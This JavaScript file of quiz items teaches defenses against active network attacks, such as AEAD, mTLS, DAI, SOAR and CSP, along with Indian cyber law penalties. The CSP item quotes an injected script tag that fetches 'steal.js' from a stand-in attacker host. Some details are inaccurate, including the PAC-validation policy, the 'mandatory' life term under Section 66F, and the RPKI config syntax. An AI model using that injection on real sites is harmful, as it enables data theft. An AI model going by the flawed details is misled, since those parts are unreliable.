const questions = [
  {
    question: "What is the primary objective of a Defensive Architecture for Active Attack Mitigation?",
    shortAnswer: "To prevent, detect in real time, contain, and automatically remediate active state alterations, message tampering, identity masquerading, replay attacks, MitM proxying, and DoS resource exhaustion.",
    explanation: "While passive defense focuses on keeping secrets unreadable through proactive encryption, active defense operates across an active feedback loop: 1. Real-time Detection (SIEM/IDS alerts on state changes); 2. In-line Cryptographic Prevention (AEAD tags, mTLS, FIDO2); 3. Automated Containment (SOAR playbooks isolating switch ports); and 4. Rapid Recovery.",
    hint: "Detecting the alarm, locking the doors automatically, and kicking the intruder out before damage occurs.",
    level: "basic",
    codeExample: `// Active Defense Loop:
// Detect Anomaly ➔ Verify Cryptographic Invariant (AEAD/HMAC) ➔ Trigger SOAR Playbook ➔ Isolate Rogue Node`
  },
  {
    question: "How does the Zero Trust Architecture ('Never Trust, Always Verify') eliminate lateral movement after an active compromise?",
    shortAnswer: "It removes perimeter-based implicit trust; every single user, device, packet, and API request must be authenticated, authorized, and cryptographically verified at every transaction.",
    explanation: "Traditional 'Castle-and-Moat' architectures trust everything inside the corporate firewall. In Zero Trust (NIST SP 800-207), all traffic is treated as hostile. Micro-segmentation, Mutual TLS (mTLS) between microservices, and continuous identity verification prevent an attacker who compromised a single workstation in Barrackpore from pivoting to the central banking database in Kolkata.",
    hint: "Requiring biometric ID badges at every single door inside the building, not just the front gate.",
    level: "moderate",
    codeExample: `// NIST SP 800-207 Zero Trust Equation:
// Access = Policy_Decision_Point( Identity, Device_Health, Geo_Context, Risk_Score )`
  },
  {
    question: "How does Authenticated Encryption with Associated Data (AEAD / AES-256-GCM) provide mathematical immunity against in-flight data tampering?",
    shortAnswer: "It computes a 128-bit Galois Authentication Tag (GHASH) over both ciphertext and plaintext headers; modifying any bit causes the tag verification to fail, dropping the packet immediately.",
    explanation: "Legacy CBC mode was vulnerable to bit-flipping attacks because encryption and authentication were separate. In AES-GCM (AEAD), the GHASH polynomial evaluates every block over the finite field $GF(2^{128})$. If an in-line MitM flips even 1 bit in transit, the computed tag mismatches with probability $1 - 2^{-128}$, causing the cryptographic engine to discard the payload before application processing.",
    hint: "An unforgeable digital wax seal that shatters if a single letter is altered.",
    level: "expert",
    codeExample: `// AEAD Decryption Verification:
const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
decipher.setAuthTag(receivedTag);
try {
  const decrypted = decipher.update(ciphertext) + decipher.final(); // Fails if tampered!
} catch (err) {
  // Tampering detected: Packet DROPPED!
}`
  },
  {
    question: "How does FIDO2 / WebAuthn eliminate credential masquerading and phishing attacks?",
    shortAnswer: "It replaces shared secrets (passwords and SMS OTPs) with asymmetric public-key cryptography bound to the origin domain inside hardware security keys.",
    explanation: "In WebAuthn, the user's hardware security key (YubiKey / Secure Enclave) generates an asymmetric keypair. When logging into `bank.in`, the authenticator signs a challenge with its private key. If an attacker tricks Mamata into visiting a phishing site `bank-fake.in`, the authenticator verifies the domain origin and refuses to sign the challenge, making phishing and credential masquerading mathematically impossible.",
    hint: "A smart key that only unlocks the door if the address on the house matches exactly.",
    level: "expert",
    codeExample: `// WebAuthn Public Key Signature Verification:
navigator.credentials.get({
  publicKey: {
    challenge: serverChallenge,
    rpId: "portal.kolkatabank.in", // Domain-bound origin verification!
    userVerification: "required"
  }
});`
  },
  {
    question: "What is a Security Orchestration, Automation, and Response (SOAR) Playbook, and how does it contain active attacks in milliseconds?",
    shortAnswer: "A predefined programmatic script triggered by SIEM alerts that executes automated remediation actions (e.g. disabling user accounts, blocking IPs at edge firewalls, isolating switch ports) without human delay.",
    explanation: "When a SIEM detects an active ARP poisoning attack on port 14 or a brute-force credential stuffing attack from an IP, human SOC analysts take 15-30 minutes to investigate. A SOAR playbook (e.g. Splunk Phantom / Cortex XSOAR) executes within 150 milliseconds: it shuts down the switch port via API, revokes active OAuth tokens, and blocks the IP across all edge firewalls.",
    hint: "An automated fire suppression system that immediately turns on the sprinklers the second smoke is detected.",
    level: "expert",
    codeExample: `// SOAR Automated Remediation Workflow:
// Trigger: SIEM Alert "DAI_ARP_SPOOF_DETECTED on Switch_04 Port_12"
// Action 1: cisco_api.shutdown_interface("Switch_04", "Gig0/12")
// Action 2: active_directory.lock_user("compromised_account")
// Action 3: slack.notify_soc_channel("Port 12 isolated in 120ms")`
  },
  {
    question: "How does Dynamic ARP Inspection (DAI) coupled with DHCP Snooping eliminate Layer 2 Masquerade attacks?",
    shortAnswer: "The switch intercepts all ARP packets on untrusted access ports, checking IP-to-MAC bindings against the trusted DHCP Snooping table and dropping spoofed packets.",
    explanation: "Without DAI, switches blindly broadcast ARP replies, allowing any device to claim any IP address. With DAI and DHCP Snooping enabled, the switch hardware ASIC intercepts every ARP frame. If host A on port 5 claims gateway IP `192.168.1.1`, the switch checks its DHCP Snooping database. Because port 5 is assigned `192.168.1.45`, the spoofed ARP reply is discarded and an SNMP alert is sent to the SOC.",
    hint: "A security guard at every switch port verifying that you only speak for your assigned IP address.",
    level: "moderate",
    codeExample: `// Cisco Switch Dynamic ARP Inspection (DAI):
switch(config)# ip dhcp snooping
switch(config)# ip dhcp snooping vlan 10
switch(config)# ip arp inspection vlan 10
switch(config-if)# ip arp inspection limit rate 15`
  },
  {
    question: "What is BCP 38 (Unicast Reverse Path Forwarding - uRPF), and how does it stop IP Address Spoofing at the network edge?",
    shortAnswer: "Routers verify that the source IP address of an incoming packet matches a valid route in the Forwarding Information Base (FIB) reachable via the receiving interface; spoofed source IPs are dropped.",
    explanation: "In Strict uRPF, when a border router receives a packet with source IP `103.25.10.50` on Interface 1, it performs a reverse lookup in its routing table. If the routing table states that `103.25.10.50` is reachable via Interface 2 (or is a bogon IP), the packet is dropped immediately, defeating volumetric reflection attacks and IP spoofing.",
    hint: "Checking that the return address on a letter came from the same neighborhood as the mailbox where it was dropped.",
    level: "expert",
    codeExample: `// Cisco IOS uRPF Strict Mode:
interface GigabitEthernet0/0/1
 ip verify unicast source reachable-via rx # Drops spoofed source IPs at ingress!`
  },
  {
    question: "Under the Indian IT Act 2000 Section 66F, what is the mandatory penalty for launching an active cyber attack on national critical infrastructure?",
    shortAnswer: "Imprisonment for LIFE for committing Cyber Terrorism that threatens the sovereignty, integrity, or critical systems of India.",
    explanation: "Section 66F states: 'Whoever, with intent to threaten the unity, integrity, security or sovereignty of India... denies or causes denial of access, or introduces computer contaminants into critical infrastructure... shall be punishable with imprisonment which may extend to imprisonment for life.'",
    hint: "Section 66F mandates LIFE IMPRISONMENT for cyber attacks on critical national infrastructure.",
    level: "basic",
    codeExample: `// Statutory Offense (IT Act Section 66F - Cyber Terrorism):
// Offense: Disrupting power grid SCADA or national payment switches via active attacks
// Penalty: Rigorous Imprisonment for LIFE`
  },
  {
    question: "How does the IPsec RFC 4303 64-Bit Sliding Window eliminate Replay Attacks?",
    shortAnswer: "The receiver maintains a 64-packet bitmask window tracking verified sequence numbers; packets with sequence numbers behind the window or already marked in the bitmask are discarded.",
    explanation: "Every IPsec ESP packet contains a monotonically increasing 64-bit sequence number. When packet $S$ arrives: if $S > \\text{max\\_seq}$, the window advances. If $S$ falls within the window $[\\text{max\\_seq} - 63, \\text{max\\_seq}]$, the receiver checks the bitmask. If bit $(S)$ is already 1 (replayed), the packet is dropped immediately. If $S < \\text{max\\_seq} - 63$, it is too old and dropped.",
    hint: "A moving 64-slot conveyor belt: old or duplicate tickets get dropped into the recycling bin.",
    level: "expert",
    codeExample: `// IPsec Anti-Replay Bitmask State Machine:
if (seq > max_seq) {
    bitmap = (bitmap << (seq - max_seq)) | 1;
    max_seq = seq;
} else if (seq >= max_seq - 63) {
    if (bitmap & (1 << (max_seq - seq))) drop_packet(); // REPLAY DETECTED!
    bitmap |= (1 << (max_seq - seq));
} else { drop_packet(); } // STALE PACKET!`
  },
  {
    question: "What is Mutual TLS (mTLS), and why is it essential for zero-trust microservice communication?",
    shortAnswer: "Both client and server authenticate each other using X.509 digital certificates before exchanging data, preventing unauthorized microservices from forging requests.",
    explanation: "In standard HTTPS, only the server presents a certificate. In mTLS, the API gateway requests a client certificate during the TLS handshake. Client microservice Mamata presents her X.509 certificate and signs the handshake exchange with her private key. A rogue container or attacker lacking the private key cannot establish a session, defeating MitM and masquerade attacks.",
    hint: "Both parties must show authenticated biometric passports before entering the secure conference room.",
    level: "moderate",
    codeExample: `// Envoy Proxy mTLS Configuration:
tls_context:
  common_tls_context:
    validation_context:
      trusted_ca: { filename: "/etc/certs/ca.crt" }
      require_client_certificate: true`
  },
  {
    question: "How does Token Bucket Rate Limiting protect Web Application Firewalls (WAF) against Layer 7 application floods?",
    shortAnswer: "Tokens accumulate in a bucket at a fixed rate $r$; each request consumes 1 token. When the bucket is empty, burst requests exceeding capacity $B$ are rejected with HTTP 429.",
    explanation: "To protect login portals or search APIs from HTTP floods, WAFs implement Token Bucket rate limiters. A client is granted a bucket with capacity $B = 50$ tokens, refilling at $r = 5$ tokens/sec. A burst of 50 requests is allowed, but sustained traffic exceeding 5 req/sec receives `HTTP 429 Too Many Requests`, smoothing traffic surges.",
    hint: "A water bucket with a small hole: you can dump a cup of water, but if you pour a bucket-full too fast, it overflows.",
    level: "moderate",
    codeExample: `// Nginx Rate Limiting Configuration:
limit_req_zone $binary_remote_addr zone=api_limit:10m rate=10r/s;
location /api/ {
    limit_req zone=api_limit burst=20 nodelay;
}`
  },
  {
    question: "What is Micro-Segmentation, and how do Host-Based Firewalls (e.g. Cilium / Calico) enforce it in Kubernetes?",
    shortAnswer: "Isolating network workloads into granular policy zones at Layer 3/4/7 based on cryptographic pod identities rather than static IP addresses.",
    explanation: "In traditional flat networks, compromising one pod gives access to all neighboring services. With Kubernetes Network Policies (Cilium eBPF), security engineers enforce strict micro-segmentation rules: `Payment-Pod` can ONLY talk to `Database-Pod` on TCP port 5432 with mTLS. Any lateral traffic to `Billing-Pod` or external IPs is dropped at the Linux kernel eBPF layer.",
    hint: "Putting every single room in the hotel into its own fireproof vault.",
    level: "expert",
    codeExample: `// Kubernetes Cilium NetworkPolicy:
apiVersion: "cilium.io/v2"
kind: CiliumNetworkPolicy
metadata: { name: "secure-payment-policy" }
spec:
  endpointSelector: { matchLabels: { app: "payment" } }
  ingress:
  - fromEndpoints: [{ matchLabels: { app: "frontend" } }]
    toPorts: [{ ports: [{ port: "8443", protocol: "TCP" }] }]`
  },
  {
    question: "How does HTTP Strict Transport Security (HSTS) with Preloading defeat SSLstrip downgrade attacks?",
    shortAnswer: "HSTS instructs browsers to communicate exclusively over HTTPS; Preloading hardcodes this policy into browser binaries before the first visit.",
    explanation: "SSLstrip intercepts initial HTTP redirects from `http://` to `https://`. HSTS (`Strict-Transport-Security: max-age=63072000; includeSubDomains; preload`) instructs the browser to internally upgrade all requests to HTTPS before sending a single byte over the wire, completely eliminating the cleartext window.",
    hint: "A permanent digital lock on the browser refusing to ever speak in cleartext.",
    level: "moderate",
    codeExample: `// Nginx HSTS Preload Header:
add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;`
  },
  {
    question: "Under the CERT-In Mandatory Directions 2022, what is the mandatory timeline for reporting active cyber security incidents?",
    shortAnswer: "All organizations in India must report cyber security incidents (DDoS, ransomware, unauthorized access) to CERT-In within 6 HOURS of detection.",
    explanation: "Under Section 70B of the IT Act and CERT-In Direction No. 20(3)/2022-CERT-In, service providers, intermediaries, data centers, and corporate bodies must mandatorily report specified cyber security incidents to CERT-In within 6 hours of noticing them.",
    hint: "CERT-In requires incident reporting within a strict 6-hour window.",
    level: "basic",
    codeExample: `// Statutory Compliance (CERT-In Mandatory Directions):
// Directive: Report all active cyber incidents within 6 HOURS
// Mandate: Section 70B IT Act 2000`
  },
  {
    question: "What is BGP RPKI (Resource Public Key Infrastructure), and how does it prevent BGP Route Hijacking?",
    shortAnswer: "RPKI allows Autonomous System owners to publish cryptographically signed Route Origin Authorizations (ROAs), proving which AS is authorized to announce an IP prefix.",
    explanation: "In standard BGP, any rogue ISP can announce an IP prefix belonging to a bank in Kolkata. With RPKI validation enabled, border routers verify the BGP announcement against the ROA cryptographic signature. If a rogue AS announces a route with an unauthorized AS number, the announcement is marked 'RPKI Invalid' and dropped.",
    hint: "A cryptographically certified deed proving you are the real owner of the highway route.",
    level: "expert",
    codeExample: `// Cisco IOS-XR RPKI BGP Configuration:
router bgp 65000
 bgp origin-as validation enable
!
route-map RPKI-FILTER drop 10
 match rpki invalid`
  },
  {
    question: "How does Linux TCP SYN Cookies (`net.ipv4.tcp_syncookies = 1`) eliminate half-open state buffer exhaustion during SYN floods?",
    shortAnswer: "It computes a 32-bit Initial Sequence Number (ISN) from connection parameters and returns it in the SYN-ACK without allocating memory in the kernel backlog queue.",
    explanation: "Under normal TCP, receiving a SYN causes the kernel to allocate a Transmission Control Block (TCB) in the `SYN_RECV` queue. An attacker floods millions of spoofed SYNs, filling the queue ($Q_{max}$) and dropping legitimate connections. SYN Cookies calculate $ISN = \\text{PRF}(IPs, Ports, t, MSS)$ and return the SYN-ACK immediately without saving any state in memory, completely defeating backlog exhaustion.",
    hint: "Handing out cloakroom claim tickets instead of reserving a giant banquet table before the guest actually arrives.",
    level: "expert",
    codeExample: `// Linux Kernel Hardening:
sudo sysctl -w net.ipv4.tcp_syncookies=1
sudo sysctl -w net.ipv4.tcp_max_syn_backlog=8192`
  },
  {
    question: "What is DNSSEC (Domain Name System Security Extensions), and how does it eliminate DNS Cache Poisoning?",
    shortAnswer: "DNSSEC adds cryptographic digital signatures (RRSIG) to DNS resource records; resolvers verify the chain of trust back to the root zone before accepting IP mappings.",
    explanation: "In standard DNS, resolvers accept unauthenticated responses. With DNSSEC, authoritative servers sign DNS records with Private Key (ZSK/KSK). When Mamata's resolver looks up `bank.in`, it verifies the cryptographic `RRSIG` signature against the parent `.in` DS record. A forged DNS spoofing response lacking the correct cryptographic signature is rejected.",
    hint: "Having the postmaster seal every address lookup with an unforgeable government wax stamp.",
    level: "moderate",
    codeExample: `// Query DNSSEC Signed Record via Dig:
dig +dnssec +multiline portal.kolkatabank.in A`
  },
  {
    question: "How does Dynamic IPsec Cryptographic Nonce Generation defeat Replay Attacks in financial API transactions?",
    shortAnswer: "The client generates a 128-bit cryptographically secure random number (nonce) and includes it in the signed payload; the server records nonces and rejects any duplicate.",
    explanation: "If an adversary captures an encrypted wire transfer request ($₹50,000$), replaying the exact same message to the server would transfer another $₹50,000$. By binding a 128-bit cryptographic nonce ($N$) and timestamp ($t$) to the HMAC/AEAD payload: $\\text{HMAC}(K, \\text{Payload} \\parallel N \\parallel t)$, the server logs $N$ in a Redis TTL cache. If $N$ is seen again, the request is rejected as a replay attack.",
    hint: "Writing a unique serial number on every check so the bank never cashes the same check twice.",
    level: "moderate",
    codeExample: `// Nonce Verification in Node.js / Express:
const isNonceValid = await redisClient.set(nonce, "USED", { NX: true, EX: 300 });
if (!isNonceValid) {
  return res.status(401).json({ error: "REPLAY ATTACK DETECTED: Nonce already consumed!" });
}`
  },
  {
    question: "What is Merkle Tree Root Hashing, and how does it verify large-scale database integrity against active tampering?",
    shortAnswer: "Hierarchical cryptographic hash trees where leaf nodes hash individual records and parent nodes hash combined pairs; a single 32-byte Merkle Root proves integrity for millions of records.",
    explanation: "If an attacker tampers with a single transaction in a 1,000,000-row database, the leaf hash changes. This propagates up the binary tree, altering the top-level Merkle Root. By anchoring the Merkle Root in immutable append-only logs (or blockchain), administrators verify database integrity with $O(\\log N)$ cryptographic proof.",
    hint: "A family tree of hashes where altering any child changes the grandparent hash at the top.",
    level: "expert",
    codeExample: `// Merkle Tree Verification:
// Root = Hash( Hash(A || B) || Hash(C || D) )
// If record C is tampered ➔ Root mismatches ➔ Integrity alert triggered instantly!`
  },
  {
    question: "Synthesize an enterprise-wide Zero Trust Active Attack Mitigation Blueprint for Critical Infrastructure in India.",
    shortAnswer: "An integrated framework combining IEEE 802.1X & DAI (L2), BCP 38 & RPKI (L3), SYN Cookies & IPsec Sliding Window (L4), mTLS & HSTS Preload (L7), FIDO2 WebAuthn (IAM), and SIEM/SOAR automated orchestration.",
    explanation: "To build total defense against active attacks: 1. Data Link: 802.1X EAP-TLS + Dynamic ARP Inspection (DAI) + DHCP Snooping. 2. Network Layer: BCP 38 uRPF + RPKI BGP validation + BGP FlowSpec. 3. Transport: Hardware SYN Proxies + Linux SYN Cookies + IPsec 64-bit Anti-Replay. 4. Application: TLS 1.3 AEAD + HSTS Preload + mTLS + WAF Token Bucket. 5. Identity: FIDO2 WebAuthn passwordless authentication. 6. Orchestration: SOAR automated containment (<200 ms).",
    hint: "Lock the switch ports, verify routes with RPKI, eliminate half-open state with SYN cookies, secure APIs with mTLS, authenticate users with FIDO2, and automate containment with SOAR.",
    level: "expert",
    codeExample: `// Master Enterprise Active Mitigation Blueprint:
// 1. Switch Security : 802.1X EAP-TLS + DAI + DHCP Snooping
// 2. WAN Routing     : BCP 38 Strict uRPF + RPKI BGP ROA Validation + BGP FlowSpec
// 3. Transport       : Linux net.ipv4.tcp_syncookies = 1 + IPsec 64-bit Anti-Replay
// 4. Application     : TLS 1.3 AES-256-GCM + HSTS Preload + mTLS + WAF Token Bucket
// 5. Identity        : FIDO2 / WebAuthn Hardware Security Keys (Zero Phishing)
// 6. Response        : SOAR Automated Switch Port Isolation (<200ms)`
  },
  {
    question: "What is Kerberos PAC (Privilege Attribute Certificate) Validation, and how does it prevent Golden Ticket attacks?",
    shortAnswer: "Domain controllers cryptographically sign the user's group memberships in the PAC; validating the PAC signature ensures forged Kerberos tickets are rejected.",
    explanation: "In a Golden Ticket attack, an adversary with the KRBTGT hash creates forged Kerberos tickets with fake Enterprise Admin privileges. Enabling strict Kerberos PAC validation forces domain member servers to verify the digital signature of the PAC directly with the Domain Controller, dropping forged tickets.",
    hint: "Calling the central office to verify the authenticity of an executive ID badge before opening the vault.",
    level: "expert",
    codeExample: `// Windows Server PAC Validation Policy:
// Group Policy: Computer Configuration → Windows Settings → Security Settings → Local Policies → Security Options
// Policy: "Domain controller: Refuse machine account password changes" + PAC validation enforcement`
  },
  {
    question: "How does Content Security Policy (CSP) defeat in-flight Cross-Site Scripting (XSS) and client-side active injection?",
    shortAnswer: "CSP headers restrict which scripts, styles, and image sources the browser is allowed to execute, blocking injected inline scripts.",
    explanation: "If an active MitM injects a malicious script `<script src='http://evil.in/steal.js'></script>` into an HTTP payload, a strict CSP header (`Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-rAnd0m'`) instructs the browser to refuse execution of any script lacking the valid cryptographic nonce, neutralizing the injection.",
    hint: "A whitelist of approved guest speakers: anyone uninvited trying to speak gets muted immediately.",
    level: "moderate",
    codeExample: `// Nginx Content Security Policy Header:
add_header Content-Security-Policy "default-src 'self'; script-src 'self' https://cdn.kolkatabank.in; object-src 'none';" always;`
  },
  {
    question: "What is BGP FlowSpec (RFC 5575), and how does it dynamically mitigate active volumetric DDoS attacks?",
    shortAnswer: "Propagates fine-grained packet matching rules to upstream ISP edge routers to drop or rate-limit attack traffic at hardware line rate.",
    explanation: "When an active volumetric flood is detected, the enterprise border router announces a BGP FlowSpec route to upstream carriers (Airtel, Jio, Tata). Upstream routers drop the malicious UDP traffic on international ingress links, ensuring only clean traffic reaches the enterprise.",
    hint: "Alerting upstream highway toll booths to block dump trucks before they enter city streets.",
    level: "expert",
    codeExample: `// BGP FlowSpec Rule Announcement:
flowspec {
    match { destination 103.25.10.0/24; protocol udp; port 123; }
    then { rate-limit 0; }
}`
  },
  {
    question: "How does Hardware Security Module (HSM) key isolation protect financial root keys against active memory extraction?",
    shortAnswer: "HSMs perform cryptographic operations inside a tamper-resistant hardware silicon chip, zeroing out memory upon physical probing and never exposing raw private keys to host RAM.",
    explanation: "If an adversary achieves memory-level root access, software private keys can be extracted from RAM. An HSM (FIPS 140-3 Level 4 certified) keeps private keys permanently inside its secure silicon enclosure, signing data internally without loading keys into host RAM.",
    hint: "A physical tamper-proof safe that does the math inside itself and never lets the combination out.",
    level: "expert",
    codeExample: `// PKCS#11 HSM Cryptographic Signing Call:
C_SignInit(hSession, &mechanism, hPrivateKey);
C_Sign(hSession, dataToSign, dataLen, signature, &sigLen);`
  },
  {
    question: "Under the Indian IT Act Section 66D, what constitutes Cheating by Personation via active computer manipulation?",
    shortAnswer: "Cheating by personation using any computer resource or communication device, punishable with imprisonment up to 3 years and a fine up to ₹1 Lakh.",
    explanation: "Section 66D states: 'Whoever, by means for any communication device or computer resource cheats by personation, shall be punished with imprisonment of either description for a term which may extend to three years and shall also be liable to fine which may extend to one lakh rupees.'",
    hint: "Section 66D covers criminal penalties for identity spoofing and active masquerade cheating.",
    level: "basic",
    codeExample: `// Statutory Offense (IT Act Section 66D):
// Offense: Cheating by personation using spoofed email/IP
// Penalty: Up to 3 Years Imprisonment + Fine up to ₹1,00,000`
  },
  {
    question: "How does the Hash-based Message Authentication Code (HMAC-SHA256) enforce cryptographic integrity on REST API payloads?",
    shortAnswer: "By computing a keyed cryptographic hash $HMAC = H( (K \\oplus opad) \\parallel H( (K \\oplus ipad) \\parallel M ) )$; modifying message $M$ without secret key $K$ causes verification to fail.",
    explanation: "When client Mamata sends an API request to `https://api.bank.in`, she appends `X-Signature: HMAC-SHA256(secret_key, payload)`. The server computes the HMAC over the received payload using the shared secret. If an attacker modified `amount: ₹500` to `₹50,000`, the computed hash mismatches and the request is rejected with `HTTP 401 Unauthorized`.",
    hint: "Signing a transaction with a secret stamp known only to you and the bank.",
    level: "moderate",
    codeExample: `// Express.js HMAC Signature Verification Middleware:
const computedSignature = crypto.createHmac('sha256', secretKey).update(req.rawBody).digest('hex');
if (computedSignature !== req.headers['x-signature']) {
    return res.status(401).json({ error: "INTEGRITY_TAMPERING_DETECTED" });
}`
  },
  {
    question: "What is Certificate Pinning, and how does it prevent Man-in-the-Middle attacks from forged Root CAs?",
    shortAnswer: "The application hardcodes the cryptographic public key hash of the authorized server certificate, rejecting connections even if signed by a trusted OS root CA.",
    explanation: "If an adversary compromises a rogue Certificate Authority (or installs a corporate proxy root CA on an employee phone), they can generate valid SSL certificates for `bank.in`. In mobile banking apps, Certificate Pinning verifies that the leaf certificate's SHA-256 public key hash matches the hardcoded key inside the mobile app binary, completely blocking proxy MitM tools.",
    hint: "Carrying a photograph of your friend in your wallet: you only talk to them if their face matches your photo.",
    level: "expert",
    codeExample: `// Android Network Security Config (Certificate Pinning):
<pin-set expiration="2027-01-01">
    <pin digest="SHA-256">7HIpactkIAq2Y49orFOOQKurWxmmSFZhBCoQYcRhJ3Y=</pin>
</pin-set>`
  },
  {
    question: "How does IEEE 802.1X Port-Based Network Access Control (PNAC) prevent unauthorized devices from connecting to switch ports?",
    shortAnswer: "Switch ports remain in an unauthorized state, dropping all traffic until the connecting client successfully completes EAP-TLS authentication with a RADIUS server.",
    explanation: "When a rogue device is plugged into an office switch port in Barrackpore, the switch intercepts the connection. The device must provide an X.509 certificate or 802.1X credentials. If authentication fails, the switch port remains closed or is assigned to a guest quarantine VLAN, preventing rogue devices from joining the corporate LAN.",
    hint: "A turnstile that requires an authenticated badge before the gate unlocks.",
    level: "moderate",
    codeExample: `// Cisco Switch 802.1X Configuration:
interface GigabitEthernet0/1
 switchport mode access
 authentication port-control auto
 dot1x pae authenticator`
  },
  {
    question: "Under the Digital Personal Data Protection (DPDP) Act 2023 Section 33, what are the maximum financial penalties for severe data breaches?",
    shortAnswer: "Penalties up to ₹250 Crores for failure of Data Fiduciaries to take reasonable security safeguards to prevent personal data breaches.",
    explanation: "Under Section 33 of the DPDP Act 2023, the Data Protection Board of India (DPBI) is empowered to impose maximum statutory penalties up to ₹250 Crores per incident for failure to implement reasonable technical security safeguards (mTLS/AEAD/Zero Trust).",
    hint: "The DPDP Act imposes maximum penalties up to ₹250 Crores for systemic data breaches.",
    level: "basic",
    codeExample: `// DPDP Statutory Penalty Standard:
// Legal Section: Section 8(5) & Section 33 DPDP Act 2023
// Maximum Penalty: Up to ₹250,00,00,000 (Rupees 250 Crores)`
  },
  {
    question: "Synthesize the mathematical relationship between False Acceptance Rate (FAR), False Rejection Rate (FRR), and Equal Error Rate (EER) in active biometric & behavioral authentication systems.",
    shortAnswer: "FAR and FRR have an inverse trade-off; the operating point where FAR = FRR is the Equal Error Rate (EER), defining the baseline accuracy of the active authentication system.",
    explanation: "In active authentication systems (FIDO2 biometrics, behavioral keystroke dynamics): increasing sensitivity decreases False Acceptance Rate (FAR - imposter accepted) but increases False Rejection Rate (FRR - legitimate user rejected). The threshold is tuned to achieve minimum Equal Error Rate ($EER < 0.001\\%$), ensuring maximum protection against active identity masquerade with minimal user friction.",
    hint: "Balancing security and convenience: tuning the lock so thieves are kept out while family members are never locked out.",
    level: "expert",
    codeExample: `// Biometric Authentication Tuning:
// Security Mode (High-Value FinTech): Target FAR < 0.0001% (Tolerates slight FRR increase)
// Balance Point: Equal Error Rate (EER) = Point where FAR == FRR`
  }
];

export default questions;
